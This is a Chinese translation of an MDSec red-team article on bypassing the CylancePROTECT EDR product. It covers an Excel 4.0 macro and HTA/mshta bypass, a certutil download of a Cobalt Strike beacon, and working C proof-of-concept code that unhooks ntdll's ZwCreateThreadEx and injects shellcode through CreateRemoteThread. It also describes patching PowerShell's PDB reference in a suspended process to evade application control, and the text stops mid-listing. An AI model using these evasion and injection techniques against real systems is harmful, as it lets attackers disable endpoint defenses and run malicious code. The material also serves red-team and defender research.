# EDR规避研究：如何绕过Cylance
|
##### 译文声明
本文是翻译文章，文章原作者 mdsec.co.uk，文章来源：mdsec.co.uk
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、前言
红队成员经常需要跟许多大型组织打交道，因此我们经常面对各种各样的EDR（端点检测和响应）解决方案。为了提高在这些环境中的成功率，我们会定期分析这些产品，确定防护特征、绕过方法以及其他策略，确保行动能畅通无阻。在这些解决方案中，我们经常面对的是CylancePROTECT，这是Cylance
Inc推出的一款产品（Cylance最近被Blackberry以14亿美元[收购](https://www.itworldcanada.com/article/blackberry-completes-acquisition-of-cylance/415246)）。
在本文中，我们将与大家分享可能帮助红队绕过CylancePROTECT的一些方法，并且简要介绍一下CylanceOPTICS（能够提供基于规则检测的一种补充方案）。我们的目标是帮助防御方理解该解决方案的工作原理，更好理解其中的不足，以便引入补充方案，解决潜在风险。
## 二、Cylance概述
CylancePROTECT（以下简称为Cylance）是基于设备策略的一种EDR解决方案，可以通过Cylance
SaaS口进行配置，具体策略包括如下安全相关选项：
  * 内存操作：控制启用哪些内存保护机制，包括漏洞利用、进程注入以及越界技术。
  * 应用控制：阻止新应用运行。
  * 脚本控制：配置该选项以便阻止Active Script（VBS及JS）、PowerShell以及Office宏。
  * 设备控制：配置对可移动设备的访问权限。
在本文中，我们将探索这些控制机制的有效性，也会分享如何绕过或禁用这些机制的方法。我们研究的对象为CylancePROTECT
2.0.1500版，这也是本文撰写时（2018年12月）的最新版本。
## 三、脚本控制
CylancePROTECT的脚本控制功能可以帮助管理员配置是否阻止或允许Windows脚本、PowerShell以及Office宏，也可以配置是否在端点上弹出警告信息。典型的配置如下所示，可以阻止所有脚本、PowerShell以及宏文件：
在这种配置下，该解决方案会禁用包含VBA宏的简单文档，甚至如下相对无害的宏也无法幸免：
同时Cylance仪表盘中将生成相应事件，如下所示：
虽然这种机制对普通的VBA宏来说非常有效，但我们发现Excel
4.0宏并没有在限制名单中，具备完全访问权限（参考[该视频](https://vimeo.com/322902013)）。
CylancePROTECT并没有限制启用Excel
4.0宏的文档，甚至当策略明确要阻止宏文档时也不起作用。因此，我们可以通过这种方法在Cylance环境中获得初始访问权限。大家可以参考[Stan
Hegt](https://twitter.com/StanHacked)发表的[研究成果](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)了解启用Excel 4.0宏文档的相关内容。
需要注意的是，其他控制策略（如阻止漏洞利用、注入及越界等内存防护策略）仍处于生效状态，稍后我们将讨论这方面内容。
除了宏之外，CylancePROTECT也能阻止Windows Script
Host文件运行（特别是VBScript及JavaScript文件）。因此，当我们尝试在`.js`或者`.vbs`文件中使用`WScript.Shell`运行脚本时，由于启动了ActiveScript防护，Cylance会阻止这种行为，如下所示：
Cylance面板中将看到如下错误信息：
然而，如果我们使用同一段JavaScript代码，将其嵌入某个HTML应用中，如下所示：
可以看到，如果脚本没有直接使用`wscript.exe`来运行，那么CylancePROTECT就不会应用同样的控制策略。如[该视频](https://vimeo.com/322903302)所示，通过`mshta.exe`运行的HTA并不会遇到任何阻拦。
能弹出计算器当然不错，接下来我们看看使用SharpShooter配合HTA时能达到什么效果。
SharpShooter可以生成一个DotNetToJScript
payload，在内存中执行原始shellcode（使用`VirtualAlloc`在内存中分配空间，获得指向该shellcode的函数指针，然后再[执行](https://github.com/mdsecactivebreach/SharpShooter/blob/master/templates/shellcode.cs)，这是在.NET中执行shellcode的标准方法）。当执行HTA时，Cylance会阻止payload并生成一个错误，查看面板后我们并不能得到太多信息，但基本上可以肯定这是内存防护控制策略所造成的结果：
这里先不要管shellcode执行的问题（回头我们会解决这个问题），我们发现Cylance对执行`calc.exe`的方式并不是特别感冒（不管是通过宏或者HTA
payload）。再来看看如果尝试下载或运行Cobalt Strike
beacon会出现什么情况。这里我们使用如下HTA，通过WScript调用`certutil`来下载和执行Cobalt Strike可执行文件：
执行过程参考[此处视频](https://vimeo.com/322903912)。
从视频中可知，如果目标环境中部署了CylancePROTECT，那么我们可能非常需要将常用的应用程序列入白名单中。
## 四、内存防护
现在来看一下内存保护机制。当分析端点安全产品的内存保护机制时，我们非常有必要澄清该产品如何检测常见的可疑API调用（如`CreateRemoteThread`或`WriteProcessMemory`）。
我们可以通过控制台选项了解Cylance支持的内存分析策略：
如果启用了这些防护策略，我们发现Cylance会将`CyMemdef.dll`注入32位进程，将`CyMemDef64.dll`注入64位进程。
为了理解Cylance部署的防护措施，我们可以利用`CreateRemoteThread`来模拟恶意软件常用的内存注入技术。简单的PoC代码如下所示：
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, procID);
    if (hProc == INVALID_HANDLE_VALUE) {
        printf("Error opening process ID %dn", procID);
        return 1;
    }
    void *alloc = VirtualAllocEx(hProc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (alloc == NULL) {
        printf("Error allocating memory in remote processn");
        return 1;
    }
    if (WriteProcessMemory(hProc, alloc, shellcode, sizeof(shellcode), NULL) == 0) {
        printf("Error writing to remote process memoryn");
        return 1;
    }
    HANDLE tRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
    if (tRemote == INVALID_HANDLE_VALUE) {
        printf("Error starting remote threadn");
        return 1;
    }
与我们设想的一致，执行这段代码会被Cylance检测到，进程也会被终止：
检查Cylance注入的DLL，可以发现Cylance在进程中植入了多个hook，以检测进程是否调用这些可疑函数。比如，如果我们在`NtCreateThreadEx`（为`CreateRemoteThread`提供syscall）上设置一个断点，然后调用该API，我们可以看到Cylance会通过`JMP`指令修改该函数：
通过`JMP`继续执行，就会触发Cylance警告，强制结束我们的程序。了解这一点后，我们可以从进程中修改被hook的指令，移除Cylance检测机制：
    #include 
    #include 
    unsigned char buf[] =
    "SHELLCODE_GOES_HERE";
    struct syscall_table {
        int osVersion;
    };
    // Remove Cylance hook from DLL export
    void removeCylanceHook(const char *dll, const char *apiName, char code) {
        DWORD old, newOld;
        void *procAddress = GetProcAddress(LoadLibraryA(dll), apiName);
        printf("[*] Updating memory protection of %s!%sn", dll, apiName);
        VirtualProtect(procAddress, 10, PAGE_EXECUTE_READWRITE, &old);
        printf("[*] Unhooking Cylancen");
        memcpy(procAddress, "x4cx8bxd1xb8", 4);
        *((char *)procAddress + 4) = code;
        VirtualProtect(procAddress, 10, old, &newOld);
    }
    int main(int argc, char **argv)
    {
        if (argc != 2) {
            printf("Usage: %s PIDn", argv[0]);
            return 2;
        }
        DWORD processID = atoi(argv[1]);
        HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, processID);
        if (proc == INVALID_HANDLE_VALUE) {
            printf("[!] Error: Could not open target process: %dn", processID);
            return 1;
        }
        printf("[*] Opened target process %dn", processID);
        printf("[*] Allocating memory in target process with VirtualAllocExn");
        void *alloc = VirtualAllocEx(proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (alloc == (void*)0) {
            printf("[!] Error: Could not allocate memory in target processn");
            return 1;
        }
        printf("[*] Allocated %d bytes at memory address %pn", sizeof(buf), alloc);
        printf("[*] Attempting to write into victim process using WriteProcessMemoryn");
        if (WriteProcessMemory(proc, alloc, buf, sizeof(buf), NULL) == 0) {
            printf("[!] Error: Could not write to target process memoryn");
            return 1;
        }
        printf("[*] WriteProcessMemory successfuln");
        // Remove the NTDLL.DLL hook added by userland DLL
        removeCylanceHook("ntdll.dll", "ZwCreateThreadEx", 0xBB);
        printf("[*] Attempting to spawn shellcode using CreateRemoteThreadn");
        HANDLE createRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
        printf("[*] Success :Dn");
    }
执行PoC后，可以看到我们的shellcode能正常执行，不会触发任何警告：
这种自我监管型的防护策略始终存在一些问题，因为这种机制需要依赖进程来检测自己是否存在可疑行为。
我们在2018年11月份开展这项研究，但之前@fsx30已公开过这方面研究内容，其中演示了如何利用该技术转储进程内存。
## 五、应用控制
Cylance还提供另一项保护功能，可以阻止用户执行某些应用程序（如PowerShell）。启用该保护功能后，如果我们尝试执行PowerShell时，就会出现如下警告：
从前文分析可知，Cylance会将DLL注入进程中，以分析并部署防护措施。了解这一点后，我们可以分析`CyMemDef64.dll`，确定这里是否存在相同限制。
我们首先发现Cylance会调用`NtQueryInformationProcess`来检测应用程序可执行文件的名称：
提取该信息后，将其与`PowerShell.exe`字符串进行对比：
如果我们将`PowerShell.exe`可执行文件名改为`PS.exe`，是否能绕过这种限制？好吧可能没那么简单（但相信我们，在没引入其他缓解措施之前，这种方法可以绕过Cylance的PowerShell保护机制，万能的`Powercatz.exe`）。这表明Cylance还有其他校验措施，我们在同一个函数中找到了如下信息：
这里可以看到`powershell.pdb`字符串会被传递给某个函数，用来判断PE调试目录中是否存在该字符串。如果满足条件，则Cylance会将另一个DLL（`CyMemDefPS64.dll`）载入PowerShell进程中，这是一个.NET
assembly，负责显示我们前面看到的警告信息。
那么如果我们修改PowerShell可执行文件的PEB信息，会出现什么情况？
非常棒，现在我们知道Cylance阻止PowerShell执行的具体原理，但以这种方式修改程序并不是理想的解决方案，因为这样会改变文件的哈希值，也会破坏文件签名。我们如何在不修改PowerShell可执行文件的基础上达到同样效果？一种可选方法就是生成PowerShell进程，并尝试在内存中修改PDB引用。
为了生成PowerShell进程，我们可以使用`CreateProcess`，传入`CREATE_SUSPENDED`标志。一旦创建处于挂起状态的线程，我们需要定位PEB结构，找到PowerShell
PE在内存中的基址。接下来只要在恢复运行前解析PE文件结构并修改PDB引用即可，相关代码如下所示：
    #include 